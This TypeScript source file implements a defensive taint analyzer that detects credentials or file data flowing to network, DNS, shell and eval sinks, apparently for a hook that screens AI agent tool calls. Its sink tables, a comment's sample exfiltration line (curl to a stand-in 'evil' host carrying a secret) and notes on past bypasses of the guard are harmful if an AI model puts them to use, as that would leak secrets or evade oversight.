import type * as TS from "typescript";
import type { Severity, TaintFlow, TaintNode, TaintResult } from "../types.js";

// ─── Lazy `typescript` load ───────────────────────────────────
//
// Requiring the TypeScript compiler costs ~145ms. `guard` runs as a PreToolUse
// hook on EVERY tool call, and the overwhelming majority of those are Bash
// commands that never need a JS/TS parse — yet a static import made every guarded
// tool call pay the full 145ms of compiler startup. Measured end-to-end guard
// latency before this change: ~350-400ms per invocation.
//
// The import above is type-only (erased at compile time); the runtime value is
// bound on first use. `require` is available because this package is CJS (no
// "type": "module"), which is also what tsup emits.
declare const require: (id: string) => unknown;
let ts!: typeof TS;

// Type-position aliases. The `ts` binding above is a VALUE (assigned lazily), so
// it cannot also serve as a type namespace; these keep annotations independent of
// when the module is loaded.
type TsNode = TS.Node;
type TsCallExpression = TS.CallExpression;
type TsNewExpression = TS.NewExpression;
type TsExpression = TS.Expression;
function ensureTs(): void {
	if (!ts) ts = require("typescript") as typeof TS;
}

// Kept intentionally free of any tree-sitter import: this module is the JS/TS
// analyzer (TypeScript compiler). Python/Bash/Rust dispatch lives in index.ts so
// that importing this file never pulls in tree-sitter's native bindings.
function isJsTs(filePath: string): boolean {
	const lower = filePath.toLowerCase();
	return [".js", ".jsx", ".mjs", ".cjs", ".ts", ".tsx"].some((e) => lower.endsWith(e));
}

// ─── Source & Sink Definitions ────────────────────────────────

const CREDENTIAL_SOURCES = new Set(["process.env", "process.env.get"]);

const FILE_READ_SOURCES = new Set([
	"fs.readFileSync",
	"fs.readFile",
	"fs.promises.readFile",
	"fs.readFileSync",
	"fs.createReadStream",
	"readFileSync",
	"readFile",
]);
// `path.join` was previously listed as a file-read SOURCE on the theory that
// joining paths with tainted data is suspicious. In practice it made every
// ordinary build script (`fs.writeFileSync(path.join(dir, name), data)`) a HIGH
// data-flow finding, and `guard --profile strict` then BLOCKED benign tool calls.
// Path construction is not a credential source; removed.

const NETWORK_INPUT_SOURCES = new Set([
	"fetch",
	"http.get",
	"https.get",
	"axios.get",
	"axios.post",
]);

const USER_INPUT_SOURCES = new Set(["process.stdin", "process.argv"]);

const ALL_SOURCES = new Set([
	...CREDENTIAL_SOURCES,
	...FILE_READ_SOURCES,
	...NETWORK_INPUT_SOURCES,
	...USER_INPUT_SOURCES,
]);

const NETWORK_OUTPUT_SINKS = new Set([
	"fetch",
	"http.request",
	"https.request",
	"http.get",
	"https.get",
	"axios",
	"axios.post",
	"axios.put",
	"axios.patch",
	"axios.request",
	"got.post",
	"got.put",
	"navigator.sendBeacon",
	"sendBeacon",
	// DNS exfiltration: encoding a secret into a hostname is a standard covert
	// channel that no HTTP-only sink table catches.
	"dns.lookup",
	"dns.resolve",
	"dns.resolve4",
	"dns.promises.lookup",
	"dns.promises.resolve",
]);

// Sink METHOD names matched on the FINAL property regardless of receiver, for
// objects we cannot resolve statically (`ws.send`, `xhr.send`, `client.post`).
// These are only ever consulted once an argument is already tainted, so the
// false-positive surface is "tainted data passed to a method with this name".
const NETWORK_SINK_METHODS = new Set(["send", "sendBeacon"]);

const EXEC_SINKS = new Set([
	"eval",
	"exec",
	"execSync",
	"spawn",
	"spawnSync",
	"execFile",
	"execFileSync",
	"fork",
	// `new Function(src)` / `Function(src)` is eval by another name.
	"Function",
	"child_process.exec",
	"child_process.execSync",
	"child_process.spawn",
	"child_process.spawnSync",
	"child_process.execFile",
	"child_process.execFileSync",
	"child_process.fork",
	"vm.runInContext",
	"vm.runInNewContext",
	"vm.runInThisContext",
	"vm.compileFunction",
]);

// Exec sink method names matched on the final property regardless of receiver.
// NOTE: bare `exec` is deliberately EXCLUDED — `/re/.exec(str)` is extremely
// common and would generate constant false positives. `exec` is a sink only as a
// bare call or through a receiver resolved to `child_process` (see resolveAlias).
const EXEC_SINK_METHODS = new Set([
	"execSync",
	"execFile",
	"execFileSync",
	"spawnSync",
	"runInNewContext",
	"runInThisContext",
	"compileFunction",
]);

const FILE_WRITE_SINKS = new Set([
	"fs.writeFileSync",
	"fs.writeFile",
	"fs.promises.writeFile",
	"fs.appendFileSync",
	"fs.appendFile",
	"fs.promises.appendFile",
]);

const ALL_SINKS = new Set([
	...NETWORK_OUTPUT_SINKS,
	...EXEC_SINKS,
	...FILE_WRITE_SINKS,
]);

// REMOVED: AI_AGENT_TOOL_WHITELIST.
// A set of "known agent tool" function names (run_command, execute_command,
// execute_bash, python_run) previously caused `visit()` to skip analysis of the
// call entirely. That made it a one-line bypass: naming your exfiltration helper
// `run_command` disabled all taint analysis of its arguments. Wrapper functions
// are now analyzed like any other call — the interprocedural summary engine
// already reasons about a wrapper whose parameter reaches an internal sink.

// ─── Taint Rules ──────────────────────────────────────────────

/** Final property of a dotted name ("cp.execSync" -> "execSync"). */
function lastSegment(name: string): string {
	const i = name.lastIndexOf(".");
	return i === -1 ? name : name.slice(i + 1);
}

/**
 * Sink predicates. A resolved callee counts as a sink either by exact qualified
 * name or, for receivers we cannot resolve statically, by its method name. Used
 * instead of raw `Set.has` so suffix-matched sinks are still classified (and
 * therefore still severity-ranked) correctly.
 */
export function isNetworkSink(name: string): boolean {
	if (NETWORK_OUTPUT_SINKS.has(name)) return true;
	return name.includes(".") && NETWORK_SINK_METHODS.has(lastSegment(name));
}

export function isExecSink(name: string): boolean {
	if (EXEC_SINKS.has(name)) return true;
	return name.includes(".") && EXEC_SINK_METHODS.has(lastSegment(name));
}

function isFileWriteSink(name: string): boolean {
	return FILE_WRITE_SINKS.has(name);
}

/** Any recognized sink. */
export function isSink(name: string): boolean {
	return isNetworkSink(name) || isExecSink(name) || isFileWriteSink(name);
}

function pickRule(
	sourceName: string,
	sinkName: string,
	isDirect: boolean,
): string {
	if (CREDENTIAL_SOURCES.has(sourceName) && isNetworkSink(sinkName))
		return "TT3";
	// Credentials into a shell/eval sink is exfiltration by another route:
	// `cp.exec("curl https://evil/?d=" + secret)` leaks just as effectively as
	// fetch() does, so it ranks with TT3 rather than as a generic direct flow.
	if (CREDENTIAL_SOURCES.has(sourceName) && isExecSink(sinkName)) return "TT6";
	if (FILE_READ_SOURCES.has(sourceName) && isNetworkSink(sinkName))
		return "TT4";
	if (
		(NETWORK_INPUT_SOURCES.has(sourceName) ||
			USER_INPUT_SOURCES.has(sourceName)) &&
		isExecSink(sinkName)
	)
		return "TT5";
	return isDirect ? "TT1" : "TT2";
}

function getRuleSeverity(ruleId: string): Severity {
	switch (ruleId) {
		case "TT1":
			return "high";
		case "TT2":
			return "medium";
		case "TT3":
			return "critical";
		case "TT4":
			return "high";
		case "TT5":
			return "critical";
		case "TT6":
			return "critical";
		default:
			return "medium";
	}
}

function classify(
	name: string,
	categories: { names: Set<string>; label: string }[],
	def: string,
): string {
	for (const cat of categories) {
		if (cat.names.has(name)) return cat.label;
	}
	return def;
}

const SOURCE_CATEGORIES = [
	{ names: CREDENTIAL_SOURCES, label: "credential/environment" },
	{ names: FILE_READ_SOURCES, label: "file read" },
	{ names: NETWORK_INPUT_SOURCES, label: "network input" },
	{ names: USER_INPUT_SOURCES, label: "user input" },
];

function sinkCategory(name: string): string {
	if (isNetworkSink(name)) return "network output";
	if (isExecSink(name)) return "code execution";
	if (isFileWriteSink(name)) return "file write";
	return "data sink";
}

interface TaintedVar {
	name: string;
	sourceCall: string;
	lineno: number;
}

// ─── AST Helpers ──────────────────────────────────────────────

/** A call or a `new` expression — both invoke code and both carry arguments. */
function isCallLike(node: TsNode): node is TsCallExpression | TsNewExpression {
	return ts.isCallExpression(node) || ts.isNewExpression(node);
}

function getCallName(node: TsNode): string | null {
	if (isCallLike(node)) {
		return getIdentifierName(node.expression);
	}
	return null;
}

/** Arguments of a call-like node. `new X()` with no parens has none. */
function argsOf(
	node: TsCallExpression | TsNewExpression,
): ReadonlyArray<TsExpression> {
	return node.arguments ?? [];
}

/**
 * `require("child_process")` appearing inline as a receiver, e.g.
 * `require("child_process").execSync(cmd)`. Resolving this lets an inline require
 * match the qualified sink table instead of yielding a null name.
 */
function inlineRequireModule(n: TsNode): string | null {
	if (!ts.isCallExpression(n)) return null;
	if (!ts.isIdentifier(n.expression) || n.expression.text !== "require") return null;
	const arg = n.arguments[0];
	return arg && ts.isStringLiteralLike(arg) ? arg.text : null;
}

function getIdentifierName(node: TsNode): string | null {
	if (ts.isIdentifier(node)) {
		return node.text;
	}
	// `this` so that `this.x` yields a stable key ("this.x"); without this a class
	// attribute assignment (this.x = secret) produced a null name and was dropped.
	if (node.kind === ts.SyntaxKind.ThisKeyword) {
		return "this";
	}
	if (ts.isPropertyAccessExpression(node)) {
		const prop = getIdentifierName(node.name);
		const inlineModule = inlineRequireModule(node.expression);
		if (inlineModule && prop) return `${inlineModule}.${prop}`;
		const obj = getIdentifierName(node.expression);
		if (obj && prop) return `${obj}.${prop}`;
	}
	return null;
}

// ─── Binding patterns (destructuring) ─────────────────────────
//
// `const { AWS_SECRET_ACCESS_KEY } = process.env` previously produced NO taint at
// all: handleAssignment called getIdentifierName(target), which returns null for a
// BindingPattern, and bailed. Destructuring is the idiomatic way to read env vars,
// so the single most common real-world spelling of credential access was invisible
// — and `guard`, which shares this analyzer, allowed it at runtime.
//
// Every name bound by the pattern inherits the taint of the initializer. This is a
// deliberate over-approximation: we do not track WHICH property carried the taint,
// because `process.env` and a parsed credentials file are tainted wholesale.

/** All identifiers bound by a (possibly nested) destructuring pattern. */
function collectBoundNames(target: TsNode): string[] {
	const names: string[] = [];
	function rec(n: TsNode): void {
		if (ts.isIdentifier(n)) {
			names.push(n.text);
			return;
		}
		if (ts.isObjectBindingPattern(n) || ts.isArrayBindingPattern(n)) {
			for (const el of n.elements) {
				if (ts.isBindingElement(el)) rec(el.name);
				// ArrayBindingPattern holes (OmittedExpression) bind nothing.
			}
			return;
		}
	}
	rec(target);
	return names;
}

// ─── Interprocedural summaries ────────────────────────────────
//
// A per-function summary lets a call site reason about a callee WITHOUT inlining:
//   - returnsSource: calling F yields data derived from an in-body source
//     (so `x = F()` taints x; `sink(F())` flows).
//   - paramReturns:  params that flow to F's return (pass-through: `id(secret)`).
//   - paramSinks:    params that reach a sink INSIDE F (so `F(secret)` flows).
// Summaries are computed ONLY for functions defined in this file (never assume an
// imported/unknown function taints or sinks — the key false-positive guardrail),
// via a monotonic bounded fixpoint so chains and bounded recursion converge.

interface FnDef {
	readonly params: string[];
	readonly body: TsNode;
}
interface FnSummary {
	returnsSource: string | null;
	paramReturns: Set<number>;
	paramSinks: Map<number, string>;
}

function sourceRankOf(name: string): number {
	if (name.startsWith("process.env") || CREDENTIAL_SOURCES.has(name)) return 4;
	if (FILE_READ_SOURCES.has(name)) return 3;
	if (NETWORK_INPUT_SOURCES.has(name)) return 2;
	if (USER_INPUT_SOURCES.has(name)) return 1;
	return 0;
}
function stronger(a: string | null, b: string | null): string | null {
	if (!a) return b;
	if (!b) return a;
	return sourceRankOf(b) > sourceRankOf(a) ? b : a;
}
// The source name a node directly denotes, if any (a source call or a
// process.env-style attribute). Returns null for non-sources.
function sourceNameOf(n: TsNode): string | null {
	const name =
		getCallName(n) ||
		(ts.isPropertyAccessExpression(n) ? getIdentifierName(n) : null);
	if (!name) return null;
	if (ALL_SOURCES.has(name)) return name;
	if (name.startsWith("process.env")) return "process.env";
	return null;
}
function isFnLike(n: TsNode): boolean {
	return (
		ts.isFunctionDeclaration(n) ||
		ts.isFunctionExpression(n) ||
		ts.isArrowFunction(n) ||
		ts.isMethodDeclaration(n)
	);
}
// Walk a subtree but do NOT descend into nested function bodies, so a summary
// reflects only its own function.
function walkOwn(node: TsNode, fn: (n: TsNode) => void): void {
	fn(node);
	node.forEachChild((c) => {
		if (isFnLike(c)) return;
		walkOwn(c, fn);
	});
}

function collectFunctions(root: TsNode): Map<string, FnDef> {
	const fns = new Map<string, FnDef>();
	function rec(node: TsNode) {
		if (ts.isFunctionDeclaration(node) && node.name && node.body) {
			fns.set(node.name.text, {
				params: node.parameters.map((p) => p.name.getText()),
				body: node.body,
			});
		} else if (
			ts.isMethodDeclaration(node) &&
			node.body &&
			ts.isIdentifier(node.name)
		) {
			fns.set(node.name.text, {
				params: node.parameters.map((p) => p.name.getText()),
				body: node.body,
			});
		} else if (
			ts.isVariableDeclaration(node) &&
			ts.isIdentifier(node.name) &&
			node.initializer &&
			(ts.isArrowFunction(node.initializer) ||
				ts.isFunctionExpression(node.initializer)) &&
			node.initializer.body
		) {
			fns.set(node.name.text, {
				params: node.initializer.parameters.map((p) => p.name.getText()),
				body: node.initializer.body,
			});
		}
		ts.forEachChild(node, rec);
	}
	rec(root);
	return fns;
}

function computeSummary(
	fn: FnDef,
	summaries: Map<string, FnSummary>,
): FnSummary {
	const paramIndex = new Map<string, number>();
	fn.params.forEach((p, i) => {
		paramIndex.set(p, i);
	});

	// Light taint propagation within the body: var -> params reaching it / strongest source.
	const fromParams = new Map<string, Set<number>>();
	const fromSource = new Map<string, string>();

	const assigns: { target: string | null; value: TsNode }[] = [];
	walkOwn(fn.body, (n) => {
		if (ts.isVariableDeclaration(n) && n.initializer && ts.isIdentifier(n.name)) {
			assigns.push({ target: n.name.text, value: n.initializer });
		} else if (
			ts.isBinaryExpression(n) &&
			n.operatorToken.kind === ts.SyntaxKind.EqualsToken
		) {
			assigns.push({ target: getIdentifierName(n.left), value: n.right });
		}
	});

	// exprTaint used to be EXPONENTIAL in call-nesting depth: on a call to a
	// summarized pass-through function it called exprTaint(arg) — a full subtree
	// traversal — and then forEachChild re-walked that same arg, doubling the work
	// at every level. A 173-byte file (`id(id(id(...process.env.TOKEN...)))`) took
	// 37 seconds, which stalls both `check` and the `guard` hot path on attacker-
	// supplied input. Memoizing per node makes each pass linear. The cache is
	// invalidated between fixpoint passes because fromParams/fromSource change.
	let taintMemo = new Map<TsNode, { params: Set<number>; source: string | null }>();
	function resetTaintMemo(): void {
		taintMemo = new Map();
	}

	function exprTaint(node: TsNode): { params: Set<number>; source: string | null } {
		const cached = taintMemo.get(node);
		if (cached) return cached;
		const params = new Set<number>();
		let source: string | null = null;
		function rec(n: TsNode) {
			const s = sourceNameOf(n);
			if (s) source = stronger(source, s);
			if (isCallLike(n)) {
				const callee = getCallName(n);
				const summ = callee ? summaries.get(callee) : undefined;
				if (summ) {
					if (summ.returnsSource) source = stronger(source, summ.returnsSource);
					if (summ.paramReturns.size) {
						argsOf(n).forEach((a, i) => {
							if (summ.paramReturns.has(i)) {
								const t = exprTaint(a);
								for (const p of t.params) params.add(p);
								source = stronger(source, t.source);
							}
						});
					}
				}
			}
			if (ts.isIdentifier(n)) {
				const pi = paramIndex.get(n.text);
				if (pi !== undefined) params.add(pi);
				const fp = fromParams.get(n.text);
				if (fp) for (const p of fp) params.add(p);
				const fs = fromSource.get(n.text);
				if (fs) source = stronger(source, fs);
			}
			n.forEachChild(rec);
		}
		rec(node);
		const result = { params, source };
		taintMemo.set(node, result);
		return result;
	}

	for (let pass = 0; pass < 6; pass++) {
		let changed = false;
		resetTaintMemo();
		for (const a of assigns) {
			if (!a.target) continue;
			const t = exprTaint(a.value);
			if (t.params.size) {
				const cur = fromParams.get(a.target) ?? new Set<number>();
				const before = cur.size;
				for (const p of t.params) cur.add(p);
				if (cur.size !== before) {
					fromParams.set(a.target, cur);
					changed = true;
				}
			}
			if (t.source) {
				const prev = fromSource.get(a.target) ?? null;
				const next = stronger(prev, t.source);
				if (next && next !== prev) {
					fromSource.set(a.target, next);
					changed = true;
				}
			}
		}
		if (!changed) break;
	}

	const paramSinks = new Map<number, string>();
	resetTaintMemo();
	walkOwn(fn.body, (n) => {
		if (!isCallLike(n)) return;
		const callName = getCallName(n);
		if (!callName) return;
		// A param reaching a DIRECT known sink's arguments.
		if (isSink(callName)) {
			argsOf(n).forEach((arg) => {
				for (const p of exprTaint(arg).params) {
					if (!paramSinks.has(p)) paramSinks.set(p, callName);
				}
			});
		}
		// A param reaching another summarized function's param-sink (n-hop chains,
		// resolved across fixpoint rounds).
		const summ = summaries.get(callName);
		if (summ && summ.paramSinks.size) {
			summ.paramSinks.forEach((internalSink, j) => {
				const arg = argsOf(n)[j];
				if (!arg) return;
				for (const p of exprTaint(arg).params) {
					if (!paramSinks.has(p)) paramSinks.set(p, internalSink);
				}
			});
		}
	});

	const paramReturns = new Set<number>();
	let returnsSource: string | null = null;
	resetTaintMemo();
	walkOwn(fn.body, (n) => {
		if (ts.isReturnStatement(n) && n.expression) {
			const t = exprTaint(n.expression);
			for (const p of t.params) paramReturns.add(p);
			returnsSource = stronger(returnsSource, t.source);
		}
	});
	// Arrow function with an expression body (no `return`): the body IS the return.
	if (!ts.isBlock(fn.body)) {
		const t = exprTaint(fn.body);
		for (const p of t.params) paramReturns.add(p);
		returnsSource = stronger(returnsSource, t.source);
	}

	return { returnsSource, paramReturns, paramSinks };
}

function sameSummary(a: FnSummary, b: FnSummary): boolean {
	if (a.returnsSource !== b.returnsSource) return false;
	if (a.paramReturns.size !== b.paramReturns.size) return false;
	for (const p of a.paramReturns) if (!b.paramReturns.has(p)) return false;
	if (a.paramSinks.size !== b.paramSinks.size) return false;
	for (const [k, v] of a.paramSinks) if (b.paramSinks.get(k) !== v) return false;
	return true;
}

function buildSummaries(root: TsNode): Map<string, FnSummary> {
	const fns = collectFunctions(root);
	const summaries = new Map<string, FnSummary>();
	for (const name of fns.keys()) {
		summaries.set(name, {
			returnsSource: null,
			paramReturns: new Set(),
			paramSinks: new Map(),
		});
	}
	const K = Math.min(fns.size + 2, 12);
	for (let round = 0; round < K; round++) {
		let changed = false;
		for (const [name, fn] of fns) {
			const s = computeSummary(fn, summaries);
			if (!sameSummary(summaries.get(name) as FnSummary, s)) {
				summaries.set(name, s);
				changed = true;
			}
		}
		if (!changed) break;
	}
	return summaries;
}

// ─── Main Analyzer ────────────────────────────────────────────

export function analyzeTaint(
	files: ReadonlyArray<{ readonly path: string; readonly content: string }>,
): TaintResult {
	ensureTs();
	const allSources: TaintNode[] = [];
	const allSinks: TaintNode[] = [];
	const allFlows: TaintFlow[] = [];

	for (const file of files) {
		// Only JS/TS here; Python/Bash/Rust are handled by the polyglot dispatch
		// in index.ts (kept separate so this file never imports tree-sitter).
		if (!isJsTs(file.path)) {
			continue;
		}

		const sourceFile = ts.createSourceFile(
			file.path,
			file.content,
			ts.ScriptTarget.Latest,
			true,
		);

		const tainted: Map<string, TaintedVar> = new Map();

		// Simple identifier aliases: `const r = axios` → r resolves to axios, so a
		// sink/source reached through the alias (`r.post(...)`, `e.API_KEY` where
		// `const e = process.env`) is still recognized. Only plain identifier =
		// identifier assignments are recorded.
		const aliases = new Map<string, string>();

		// Module bindings, so a namespaced sink resolves to its qualified name:
		//   const cp = require("child_process")        -> cp        => child_process
		//   import * as cp from "child_process"        -> cp        => child_process
		// and direct function bindings:
		//   const { execFile } = require("child_process") -> execFile => child_process.execFile
		//   import { execFile } from "child_process"      -> execFile => child_process.execFile
		//
		// Without this, `cp.exec(secret)` resolved to the literal name "cp.exec",
		// matched nothing in the sink table, and a plain credential-exfil script
		// reported CLEAN. Only bare `exec()` was ever detected.
		const moduleAliases = new Map<string, string>();
		const functionAliases = new Map<string, string>();

		function recordRequire(nameNode: TsNode, moduleName: string): void {
			if (ts.isIdentifier(nameNode)) {
				moduleAliases.set(nameNode.text, moduleName);
				return;
			}
			if (ts.isObjectBindingPattern(nameNode)) {
				for (const el of nameNode.elements) {
					if (!ts.isBindingElement(el) || !ts.isIdentifier(el.name)) continue;
					const exported =
						el.propertyName && ts.isIdentifier(el.propertyName)
							? el.propertyName.text
							: el.name.text;
					functionAliases.set(el.name.text, `${moduleName}.${exported}`);
				}
			}
		}

		function collectImportAliases(root: TsNode): void {
			function rec(n: TsNode): void {
				// const X = require("m") / const { a } = require("m")
				if (ts.isVariableDeclaration(n) && n.initializer) {
					const mod = inlineRequireModule(n.initializer);
					if (mod) recordRequire(n.name, mod);
				}
				// import ... from "m"
				if (ts.isImportDeclaration(n) && ts.isStringLiteralLike(n.moduleSpecifier)) {
					const mod = n.moduleSpecifier.text;
					const clause = n.importClause;
					if (clause) {
						if (clause.name) moduleAliases.set(clause.name.text, mod);
						const b = clause.namedBindings;
						if (b && ts.isNamespaceImport(b)) moduleAliases.set(b.name.text, mod);
						if (b && ts.isNamedImports(b)) {
							for (const el of b.elements) {
								const exported = el.propertyName?.text ?? el.name.text;
								functionAliases.set(el.name.text, `${mod}.${exported}`);
							}
						}
					}
				}
				n.forEachChild(rec);
			}
			rec(root);
		}
		collectImportAliases(sourceFile);

		function resolveAlias(name: string): string {
			// A bare name bound directly to a module export wins outright.
			const fn = functionAliases.get(name);
			if (fn) return fn;
			const dot = name.indexOf(".");
			const head = dot === -1 ? name : name.slice(0, dot);
			const mod = moduleAliases.get(head);
			if (mod) return mod + (dot === -1 ? "" : name.slice(dot));
			const target = aliases.get(head);
			return target ? target + (dot === -1 ? "" : name.slice(dot)) : name;
		}

		// Per-file function summaries for interprocedural flow (see the summary
		// engine above). Same-file functions only.
		const summaries = buildSummaries(sourceFile);

		// The tainted origin (source-call name) an argument expression carries, if
		// any — a direct source or a reference to an already-tainted variable/member.
		function argOrigin(argNode: TsNode): string | null {
			let origin: string | null = null;
			function rec(n: TsNode) {
				if (!origin) {
					const rawName =
						getCallName(n) ||
						(ts.isPropertyAccessExpression(n) ? getIdentifierName(n) : null);
					const name = rawName ? resolveAlias(rawName) : null;
					if (name && (ALL_SOURCES.has(name) || name.startsWith("process.env"))) {
						origin = name.startsWith("process.env") ? "process.env" : name;
					}
				}
				if (!origin && ts.isIdentifier(n)) {
					const t = tainted.get(n.text);
					if (t) origin = t.sourceCall;
				} else if (!origin && ts.isPropertyAccessExpression(n)) {
					const full = getIdentifierName(n);
					if (full) {
						const t = tainted.get(full);
						if (t) origin = t.sourceCall;
					}
				}
				if (!origin) n.forEachChild(rec);
			}
			rec(argNode);
			return origin;
		}

		function emit(
			ruleId: string,
			lineno: number,
			msg: string,
			srcName: string,
			sinkName: string,
		) {
			const sourceNode: TaintNode = {
				file: file.path,
				line: lineno,
				label: srcName,
				type: "source",
			};
			const sinkNode: TaintNode = {
				file: file.path,
				line: lineno,
				label: sinkName,
				type: "sink",
			};
			allSources.push(sourceNode);
			allSinks.push(sinkNode);

			allFlows.push({
				source: sourceNode,
				sink: sinkNode,
				path: [msg],
				severity: getRuleSeverity(ruleId),
				description: msg,
			});
		}

		function visit(node: TsNode) {
			// 1. Check for assignments to track tainted variables
			if (ts.isVariableDeclaration(node) && node.initializer) {
				handleAssignment(node.name, node.initializer);
			} else if (
				ts.isBinaryExpression(node) &&
				node.operatorToken.kind === ts.SyntaxKind.EqualsToken
			) {
				handleAssignment(node.left, node.right);
			}

			// 2. Check for sink calls
			if (isCallLike(node)) {
				const rawSink = getCallName(node);
				const sinkName = rawSink ? resolveAlias(rawSink) : null;

				if (sinkName && isSink(sinkName)) {
					const lineno =
						sourceFile.getLineAndCharacterOfPosition(node.getStart()).line + 1;

					// Check flows inside the sink's arguments
					argsOf(node).forEach((arg) => {
						checkDirectSources(arg, sinkName, lineno);
						checkTaintedVars(arg, sinkName, lineno);
					});
				}

				// Interprocedural param-to-sink: a call to a same-file function whose
				// parameter reaches an internal sink, passed a tainted argument.
				const summ = sinkName ? summaries.get(sinkName) : undefined;
				if (summ && summ.paramSinks.size) {
					const lineno =
						sourceFile.getLineAndCharacterOfPosition(node.getStart()).line + 1;
					summ.paramSinks.forEach((internalSink, i) => {
						const arg = argsOf(node)[i];
						if (!arg) return;
						const o = argOrigin(arg);
						if (o) {
							emit(
								pickRule(o, internalSink, false),
								lineno,
								`Interprocedural flow: ${o} -> ${internalSink} via ${sinkName}() (argument ${i + 1})`,
								o,
								internalSink,
							);
						}
					});
				}
			}

			ts.forEachChild(node, visit);
		}

		function handleAssignment(target: TsNode, value: TsNode) {
			// Destructuring binds many names at once; a single identifier binds one.
			// Both are handled by resolving the initializer's taint ONCE and applying
			// it to every bound name.
			const isPattern =
				ts.isObjectBindingPattern(target) || ts.isArrayBindingPattern(target);
			const targetNames = isPattern
				? collectBoundNames(target)
				: (() => {
						const n = getIdentifierName(target);
						return n ? [n] : [];
					})();
			if (targetNames.length === 0) return;

			// Record a plain `x = y` identifier alias (y a bare identifier) so a sink
			// reached via x is resolved back to y.
			if (ts.isIdentifier(target) && ts.isIdentifier(value)) {
				aliases.set(target.text, value.text);
			}

			const lineno =
				sourceFile.getLineAndCharacterOfPosition(target.getStart()).line + 1;
			let sourceFound = false;

			// Mark every name bound by this assignment as tainted by `sourceCall`.
			function taintTargets(sourceCall: string, at: number): void {
				for (const name of targetNames) {
					tainted.set(name, { name, sourceCall, lineno: at });
				}
				sourceFound = true;
			}

			function findSource(n: TsNode) {
				const rawName =
					getCallName(n) ||
					(ts.isPropertyAccessExpression(n) ? getIdentifierName(n) : null);
				const name = rawName ? resolveAlias(rawName) : null;
				if (name && ALL_SOURCES.has(name as string)) {
					taintTargets(name as string, lineno);
				} else if (name?.startsWith("process.env")) {
					taintTargets("process.env", lineno);
				} else if (isCallLike(n) && name && summaries.has(name)) {
					// Interprocedural: `x = F(...)` where F returns tainted data (from an
					// in-body source, or by passing an argument through to its return).
					const summ = summaries.get(name) as FnSummary;
					if (summ.returnsSource) {
						taintTargets(summ.returnsSource, lineno);
					} else if (summ.paramReturns.size) {
						for (const i of summ.paramReturns) {
							const arg = argsOf(n)[i];
							const o = arg ? argOrigin(arg) : null;
							if (o) {
								taintTargets(o, lineno);
								break;
							}
						}
					}
				} else if (ts.isIdentifier(n)) {
					// Taint propagation: target = taintedVar
					const t = tainted.get(n.text);
					if (t) {
						taintTargets(t.sourceCall, t.lineno);
					}
				}
				if (!sourceFound) ts.forEachChild(n, findSource);
			}
			findSource(value);
		}

		function checkDirectSources(
			argNode: TsNode,
			sinkName: string,
			lineno: number,
		) {
			function find(n: TsNode) {
				const rawName =
					getCallName(n) ||
					(ts.isPropertyAccessExpression(n) ? getIdentifierName(n) : null);
				const name = rawName ? resolveAlias(rawName) : null;
				if (name && (ALL_SOURCES.has(name as string) || name.startsWith("process.env"))) {
					const srcName = name.startsWith("process.env") ? "process.env" : name;
					const rule = pickRule(srcName, sinkName, true);
					const srcCat = classify(srcName, SOURCE_CATEGORIES, "data source");
					const sinkCat = sinkCategory(sinkName);
					emit(
						rule,
						lineno,
						`Direct flow: ${srcName} (${srcCat}) -> ${sinkName} (${sinkCat})`,
						srcName,
						sinkName,
					);
				} else if (ts.isCallExpression(n) && name && summaries.has(name)) {
					// Interprocedural: a source-returning (or pass-through) function called
					// directly inside a sink argument, e.g. `fetch(url, getSecret())`.
					const summ = summaries.get(name) as FnSummary;
					const origin =
						summ.returnsSource ??
						(summ.paramReturns.size
							? [...summ.paramReturns]
									.map((i) => (n.arguments[i] ? argOrigin(n.arguments[i]) : null))
									.find((o): o is string => !!o) ?? null
							: null);
					if (origin) {
						emit(
							pickRule(origin, sinkName, false),
							lineno,
							`Interprocedural flow: ${origin} -> ${sinkName} via ${name}()`,
							origin,
							sinkName,
						);
					}
				}
				ts.forEachChild(n, find);
			}
			find(argNode);
		}

		function checkTaintedVars(
			argNode: TsNode,
			sinkName: string,
			lineno: number,
		) {
			function emitTainted(t: TaintedVar) {
				const rule = pickRule(t.sourceCall, sinkName, false);
				const srcCat = classify(t.sourceCall, SOURCE_CATEGORIES, "data source");
				const sinkCat = sinkCategory(sinkName);
				emit(
					rule,
					lineno,
					`Tainted flow: '${t.name}' from ${t.sourceCall} (line ${t.lineno}, ${srcCat}) -> ${sinkName} (${sinkCat})`,
					t.sourceCall,
					sinkName,
				);
			}

			function find(n: TsNode) {
				// Member access (o.x, this.x): look the WHOLE access path up in the
				// tainted map. Previously only bare identifiers were checked, so a
				// tainted object field written as `o.x = secret` was a dead store —
				// never matched at the sink. Recurse into the object expression but not
				// the property-name identifier (which is not a variable reference).
				if (ts.isPropertyAccessExpression(n)) {
					const full = getIdentifierName(n);
					if (full) {
						const t = tainted.get(full);
						if (t) emitTainted(t);
					}
					find(n.expression);
					return;
				}
				if (ts.isIdentifier(n)) {
					const t = tainted.get(n.text);
					if (t) emitTainted(t);
					return;
				}
				ts.forEachChild(n, find);
			}
			find(argNode);
		}

		visit(sourceFile);
	}

	// Deduplicate flows
	const uniqueFlows = Array.from(
		new Map(allFlows.map((f) => [f.description, f])).values(),
	);
	const severityOrder: Record<Severity, number> = {
		critical: 0,
		high: 1,
		medium: 2,
		low: 3,
		info: 4,
	};
	const sortedFlows = uniqueFlows.sort(
		(a, b) => severityOrder[a.severity] - severityOrder[b.severity],
	);

	// Deduplicate sources and sinks
	const uniqueSources = Array.from(
		new Map(
			allSources.map((s) => [`${s.file}:${s.line}:${s.label}`, s]),
		).values(),
	);
	const uniqueSinks = Array.from(
		new Map(
			allSinks.map((s) => [`${s.file}:${s.line}:${s.label}`, s]),
		).values(),
	);

	return {
		flows: sortedFlows,
		sources: uniqueSources,
		sinks: uniqueSinks,
	};
}
